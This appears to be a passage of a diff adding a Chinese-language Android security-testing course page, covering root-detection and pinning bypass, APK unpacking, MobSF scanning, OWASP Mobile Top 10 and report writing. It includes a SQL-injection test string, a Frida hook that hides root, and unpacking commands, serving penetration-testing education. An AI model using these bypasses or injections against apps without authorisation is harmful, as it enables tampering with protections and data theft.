+  --where "1=1 UNION SELECT * FROM sqlite_master--"  <span class="cm"># SQL 注入測試</span></pre>
+</div>
+</div>
+
+<!-- L4-4 Root 檢測與憑證固定繞過 -->
+<div class="cb" id="l4-4">
+<h2>Root 檢測與憑證固定繞過</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Root 檢測常用方法與 Frida 繞過</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── App 常用的 Root 檢測方法 ───</span>
+<span class="cm">// 1. 檢查 su 文件是否存在</span>
+<span class="kw">new</span> File(<span class="st">"/system/bin/su"</span>).exists()
+<span class="kw">new</span> File(<span class="st">"/sbin/su"</span>).exists()
+
+<span class="cm">// 2. 嘗試執行 su 命令</span>
+Runtime.getRuntime().exec(<span class="st">"su"</span>)
+
+<span class="cm">// 3. 檢查已安裝的包（Magisk/SuperSU）</span>
+pm.getPackageInfo(<span class="st">"com.topjohnwu.magisk"</span>, 0)
+
+<span class="cm">// 4. 檢查系統分區是否可寫</span>
+<span class="kw">new</span> File(<span class="st">"/system"</span>).canWrite()
+
+<span class="cm">// 5. SafetyNet / Play Integrity API（最難繞過）</span>
+
+<span class="cm">// ─── Frida 繞過策略（Hook 上述所有方法）───</span>
+Java.perform(<span class="kw">function</span>() {
+    <span class="cm">// Hook File.exists() 過濾 su 相關路徑</span>
+    <span class="kw">var</span> File = Java.use(<span class="st">'java.io.File'</span>);
+    File.exists.implementation = <span class="kw">function</span>() {
+        <span class="kw">var</span> path = <span class="kw">this</span>.getAbsolutePath();
+        <span class="kw">if</span> (path.indexOf(<span class="st">'su'</span>) !== -<span class="nu">1</span> || path.indexOf(<span class="st">'magisk'</span>) !== -<span class="nu">1</span>) {
+            console.log(<span class="st">'[*] Hiding: '</span> + path);
+            <span class="kw">return</span> <span class="kw">false</span>;
+        }
+        <span class="kw">return</span> <span class="kw">this</span>.exists();
+    };
+});
+
+<span class="cm">// ─── Magisk Hide / Zygisk DenyList（設備端隱藏 Root）───</span>
+<span class="cm">// Magisk 設置 → DenyList → 添加目標 App → 對該 App 隱藏 Root 痕跡</span>
+<span class="cm">// 適用於繞過 SafetyNet 等難以 Hook 的檢測</span></pre>
+</div>
+</div>
+
+<!-- L4-5 加固與反加固 -->
+<div class="cb" id="l4-5">
+<h2>Android 加固與反加固技術</h2>
+<p>應用加固是保護 APK 免被逆向分析的技術，常見於金融、遊戲類 App。安全測試人員需要能夠識別加固方案並進行脫殼分析。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>加固方案</th><th>廠商</th><th>識別特徵</th><th>脫殼方法</th></tr></thead>
+    <tbody>
+      <tr><td><strong>娜迦（Nagapt）/ 梆梆安全</strong></td><td>國內廠商</td><td>APK 包含 libDexProtect.so 或 libsecexe.so</td><td>Frida + FART 主動調用脫殼</td></tr>
+      <tr><td><strong>騰訊樂固</strong></td><td>騰訊</td><td>assets/ 中有 .jar 文件，包名中有 legu</td><td>Frida DexDump 內存 dump</td></tr>
+      <tr><td><strong>阿里聚安全</strong></td><td>阿里</td><td>libmobisec.so 或 com.alibaba.util</td><td>Frida 內存搜索 + dump</td></tr>
+      <tr><td><strong>VMP 保護</strong></td><td>各廠</td><td>代碼被替換為自定義虛擬機指令</td><td>最難，需分析自定義 VM，或直接 Hook 行為</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">常用脫殼工具與方法</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── FRIDA-DEXDump（最常用）───</span>
+pip3 install frida-dexdump
+frida-dexdump -U -f com.target.app
+<span class="cm"># 在 App 運行時從記憶體中 dump 所有載入的 .dex 文件</span>
+<span class="cm"># 輸出到當前目錄，可直接用 jadx 分析</span>
+
+<span class="cm"># ─── FART（主動調用脫殼）───</span>
+<span class="cm"># 需要刷入修改版 ROM（集成 FART 的 Android），強制執行所有方法</span>
+<span class="cm"># 適合代碼抽取型加固（方法體在調用時才解密）</span>
+
+<span class="cm"># ─── 使用 Frida 搜索記憶體中的 .dex 文件頭 ───</span>
+<span class="cm"># .dex 文件頭魔數：64 65 78 0A（"dex\n"）</span>
+<span class="cm"># Frida 腳本搜索所有符合的內存區域並 dump</span>
+
+<span class="cm"># ─── 識別加固（jadx 分析時無法看到代碼）───</span>
+<span class="cm"># 症狀：jadx 反編譯後只看到 Application.onCreate() 和一個空殼</span>
+<span class="cm"># 主要的類都在加密的 .so 或 assets 中，需要脫殼才能分析</span></pre>
+</div>
+</div>
+
+<!-- ===== CH5: 自動化與報告 ===== -->
+
+<!-- L5-1 MobSF -->
+<div class="cb" id="l5-1">
+<h2>MobSF 自動化掃描</h2>
+<p>MobSF（Mobile Security Framework）是一個開源的移動應用自動化靜態/動態分析平台，支持 Android（APK）和 iOS（IPA）。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">MobSF — 安裝與使用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Docker 快速安裝（推薦）───</span>
+docker pull opensecurity/mobile-security-framework-mobsf:latest
+docker run -it --rm \
+  -p 8000:8000 \
+  -p 1337:1337 \
+  opensecurity/mobile-security-framework-mobsf:latest
+
+<span class="cm"># 訪問 http://localhost:8000</span>
+<span class="cm"># 默認帳號密碼：mobsf / mobsf</span>
+
+<span class="cm"># ─── 靜態分析：上傳 APK ───</span>
+<span class="cm"># 1. 點擊 Upload 上傳 APK</span>
+<span class="cm"># 2. MobSF 自動執行：</span>
+<span class="cm">#    - AndroidManifest 分析（暴露組件、危險權限）</span>
+<span class="cm">#    - 代碼掃描（硬編碼密鑰、危險 API、加密問題）</span>
+<span class="cm">#    - 憑證分析（SSL 憑證配置）</span>
+<span class="cm">#    - 惡意代碼檢測（VirusTotal 整合）</span>
+<span class="cm"># 3. 生成安全評分和詳細報告</span>
+<span class="cm"># 4. 可導出 PDF/JSON 格式報告</span>
+
+<span class="cm"># ─── API 自動化集成（CI/CD 管線）───</span>
+<span class="cm"># 上傳 APK</span>
+curl -F "file=@target.apk" http://localhost:8000/api/v1/upload \
+  -H "Authorization: YOUR_API_KEY"
+
+<span class="cm"># 觸發掃描</span>
+curl -X POST "http://localhost:8000/api/v1/scan" \
+  -d "scan_type=apk&file_name=target.apk&hash=FILE_HASH" \
+  -H "Authorization: YOUR_API_KEY"
+
+<span class="cm"># 獲取 JSON 報告</span>
+curl "http://localhost:8000/api/v1/report_json?hash=FILE_HASH" \
+  -H "Authorization: YOUR_API_KEY"</pre>
+</div>
+</div>
+
+<!-- L5-2 OWASP Mobile Top 10 -->
+<div class="cb" id="l5-2">
+<h2>OWASP Mobile Top 10 對照</h2>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>#</th><th>風險名稱</th><th>本課程對應章節</th><th>典型案例</th></tr></thead>
+    <tbody>
+      <tr><td class="mc">M1</td><td><strong>憑證使用不當</strong></td><td>L2-3 代碼審計</td><td>硬編碼 API Key、明文存儲密碼、弱加密算法（DES/MD5）</td></tr>
+      <tr><td class="mc">M2</td><td><strong>不安全的數據存儲</strong></td><td>L4-1</td><td>SharedPreferences 明文 Token、SD 卡存儲隱私數據</td></tr>
+      <tr><td class="mc">M3</td><td><strong>不安全的通訊</strong></td><td>L3-1</td><td>HTTP 明文傳輸、SSL Pinning 缺失、弱 TLS 配置</td></tr>
+      <tr><td class="mc">M4</td><td><strong>不充分的身份驗證</strong></td><td>L3-3 Frida</td><td>本地端 isLoggedIn 可被 Hook 繞過、缺少服務器端驗證</td></tr>
+      <tr><td class="mc">M5</td><td><strong>不充分的加密</strong></td><td>L2-3 代碼審計</td><td>ECB 模式 AES、可預測 IV、自製加密算法</td></tr>
+      <tr><td class="mc">M6</td><td><strong>不充分的授權</strong></td><td>L4-3 Intent 劫持</td><td>組件暴露無權限保護、深度連結未驗證調用者</td></tr>
+      <tr><td class="mc">M7</td><td><strong>客戶端代碼品質問題</strong></td><td>L2-3 / L4-2</td><td>SQL 注入（ContentProvider）、XSS（WebView）、緩衝區溢出</td></tr>
+      <tr><td class="mc">M8</td><td><strong>代碼篡改</strong></td><td>L4-5 加固</td><td>無完整性校驗的 APK 可被修改重打包，繞過付費或安全控制</td></tr>
+      <tr><td class="mc">M9</td><td><strong>逆向工程</strong></td><td>L2-1 靜態分析</td><td>未混淆的代碼洩露業務邏輯和 API 密鑰</td></tr>
+      <tr><td class="mc">M10</td><td><strong>多餘功能</strong></td><td>L2-2 Manifest</td><td>調試功能殘留生產版、後門帳號、隱藏的測試 Activity</td></tr>
+    </tbody>
+  </table>
+</div>
+</div>
+
+<!-- L5-3 報告撰寫 -->
+<div class="cb" id="l5-3">
+<h2>移動安全測試報告撰寫</h2>
+<p>移動安全測試報告與 Web 滲透測試報告結構相似，但需要額外包含測試環境（設備型號/Android 版本/Root 狀態）和移動特有的漏洞分類（使用 OWASP Mobile Top 10 或 CVSS）。</p>
+
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>測試環境說明</strong> — 設備型號（如 Pixel 6 / 模擬器 API 30）、Android 版本、Root 狀態、測試 App 版本號和包名、測試時間範圍</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>測試方法</strong> — 靜態分析工具（jadx/MobSF）、動態分析工具（Frida/Objection/Burp Suite）、是否進行網絡流量分析、是否通過 Frida 進行 Hook 測試</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>漏洞詳情（按 OWASP Mobile Top 10 分類）</strong> — 每個漏洞的位置（類名/方法名/Manifest 行數）、截圖、概念验证（PoC）代碼、業務影響評估</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>修復建議</strong> — 針對每個漏洞的具體代碼修復方案（如：「SharedPreferences 中的 authToken 應使用 EncryptedSharedPreferences 替代」）</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>再測試（Retest）部分</strong> — 客戶修復後，記錄每個漏洞的重新測試結果（已修復/部分修復/未修復）</div></div>
+</div>
+
+<div class="done-banner">
+  <h3>Stage 05 完成：Android 移動安全</h3>
+  <p>你已掌握 Android 安全測試的完整技術棧：APK 靜態分析（jadx/apktool）、動態分析（Frida/Objection）、HTTPS 抓包與憑證繞過、四大組件安全測試、不安全存儲分析和反加固技術。繼續進入 iOS 安全測試。</p>
+  <div class="btn-row">
+    <a href="stage6.html" class="btn-p">前往第六階段：iOS 安全測試</a>
+    <a href="stage4.html" class="btn-g">回顧第四階段</a>
+    <a href="index.html" class="btn-g">返回課程首頁</a>
+  </div>
+</div>
+
+</div><!-- /cw -->
+
+<div class="lnav">
+  <button class="lb" id="prevb" onclick="prevL()" disabled>&#8592; 上一課</button>
+  <div class="ln-mid">
+    <div class="ln-cnt" id="cnt">1 / 20</div>
+    <div class="ln-sub" id="lsub">Android 架構與安全模型</div>
+  </div>
+  <button class="lb pri" id="nextb" onclick="nextL()">下一課 &#8594;</button>
+</div>
+
+</main>
+</div>
+
+<script>
+const LS=[
+  {id:'l1-1',ch:'CH1',title:'Android 架構與安全模型',time:'20分鐘',type:'基礎架構'},
+  {id:'l1-2',ch:'CH1',title:'APK 結構解析與四大組件安全',time:'20分鐘',type:'APK 結構'},
+  {id:'l1-3',ch:'CH1',title:'測試環境搭建：模擬器與真機',time:'25分鐘',type:'環境配置'},
+  {id:'l1-4',ch:'CH1',title:'ADB 工具完整指南',time:'20分鐘',type:'核心工具'},
+  {id:'l2-1',ch:'CH2',title:'APK 反編譯：jadx / apktool',time:'25分鐘',type:'靜態分析'},
+  {id:'l2-2',ch:'CH2',title:'AndroidManifest.xml 安全審計',time:'20分鐘',type:'Manifest 分析'},
+  {id:'l2-3',ch:'CH2',title:'代碼審計：敏感信息與危險 API',time:'25分鐘',type:'代碼審計'},
+  {id:'l2-4',ch:'CH2',title:'資源與資產提取分析',time:'20分鐘',type:'資源提取'},
+  {id:'l3-1',ch:'CH3',title:'HTTP(S) 流量抓包：Burp + 憑證繞過',time:'25分鐘',type:'流量分析'},
+  {id:'l3-2',ch:'CH3',title:'Frida 動態插樁入門',time:'25分鐘',type:'Frida 基礎'},
+  {id:'l3-3',ch:'CH3',title:'Frida Hook 實戰：繞過登入與加密',time:'30分鐘',type:'Frida 實戰'},
+  {id:'l3-4',ch:'CH3',title:'Objection 自動化測試框架',time:'20分鐘',type:'自動化測試'},
+  {id:'l4-1',ch:'CH4',title:'不安全的數據存儲',time:'20分鐘',type:'M2 存儲'},
+  {id:'l4-2',ch:'CH4',title:'WebView 漏洞：XSS 與 UXSS',time:'20分鐘',type:'WebView'},
+  {id:'l4-3',ch:'CH4',title:'Intent 劫持與深度連結濫用',time:'20分鐘',type:'Intent'},
+  {id:'l4-4',ch:'CH4',title:'Root 檢測與憑證固定繞過',time:'25分鐘',type:'繞過技術'},
+  {id:'l4-5',ch:'CH4',title:'Android 加固與反加固技術',time:'30分鐘',type:'加固分析'},
+  {id:'l5-1',ch:'CH5',title:'MobSF 自動化掃描',time:'20分鐘',type:'自動化'},
+  {id:'l5-2',ch:'CH5',title:'OWASP Mobile Top 10 對照',time:'15分鐘',type:'標準映射'},
+  {id:'l5-3',ch:'CH5',title:'移動安全測試報告撰寫',time:'20分鐘',type:'報告撰寫'},
+];
+const done=new Set(JSON.parse(localStorage.getItem('s5_done')||'[]'));
+let cur=0;
+function go(id,btn){
+  document.querySelectorAll('.cb').forEach(b=>b.classList.remove('on'));
+  document.querySelectorAll('.ls-btn').forEach(b=>b.classList.remove('lact'));
+  const bl=document.getElementById(id);if(bl)bl.classList.add('on');
+  if(btn)btn.classList.add('lact');
+  cur=LS.findIndex(l=>l.id===id);syncUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function toggleCh(btn,id){
+  btn.classList.toggle('copen');
+  const l=document.getElementById(id);if(l)l.classList.toggle('lopen');
+}
+function prevL(){if(cur>0)findAndGo(LS[cur-1].id);}
+function nextL(){
+  done.add(LS[cur].id);
+  localStorage.setItem('s5_done',JSON.stringify([...done]));
+  if(cur<LS.length-1)findAndGo(LS[cur+1].id);
+}
+function findAndGo(id){
+  let btn=null;
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    if((b.getAttribute('onclick')||'').includes("'"+id+"'")){
+      btn=b;
+      let p=b.parentElement;
+      if(p&&!p.classList.contains('lopen')){
+        p.classList.add('lopen');
+        const cb=p.previousElementSibling;
+        if(cb)cb.classList.add('copen');
+      }
+    }
+  });
+  go(id,btn);
+}
+function syncUI(){
+  const l=LS[cur];if(!l)return;
+  document.getElementById('crumb').innerHTML=`STAGE 05 &gt; ${l.ch} &gt; <em>${l.title}</em>`;
+  document.getElementById('ltitle').textContent=l.title;
+  document.getElementById('chip1').textContent=l.type;
+  document.getElementById('chip2').textContent=`預計 ${l.time}`;
+  document.getElementById('cnt').textContent=`${cur+1} / ${LS.length}`;
+  document.getElementById('lsub').textContent=l.title;
+  document.getElementById('prevb').disabled=cur===0;
+  document.getElementById('nextb').disabled=cur===LS.length-1;
+  if(cur===LS.length-1)document.getElementById('nextb').textContent='Stage 完成';
+  else document.getElementById('nextb').innerHTML='下一課 &#8594;';
+  const pct=done.size?Math.round(done.size/LS.length*100):0;
+  document.getElementById('pct').textContent=pct+'%';
+  document.getElementById('pf').style.width=pct+'%';
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    const m=(b.getAttribute('onclick')||'').match(/'(l\d+-\d+)'/);
+    if(m&&done.has(m[1])&&!b.classList.contains('lact'))b.classList.add('ldone');
+  });
+}
+function chkQ(el,correct){
+  const box=el.closest('.quiz');
+  if(box.dataset.answered)return;
+  box.dataset.answered='1';
+  box.querySelectorAll('.qo').forEach(o=>o.style.pointerEvents='none');
+  el.classList.add(correct?'ok':'bad');
+  if(!correct)box.querySelectorAll('.qo').forEach(o=>{
+    if((o.getAttribute('onclick')||'').includes('true'))o.classList.add('ok');
+  });
+  const exp=box.querySelector('.q-exp');
+  if(exp)exp.classList.add('on');
+}
+function cpCode(btn){
+  const pre=btn.closest('.cblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='已複製';setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+syncUI();
+</script>
+</body>
+</html>
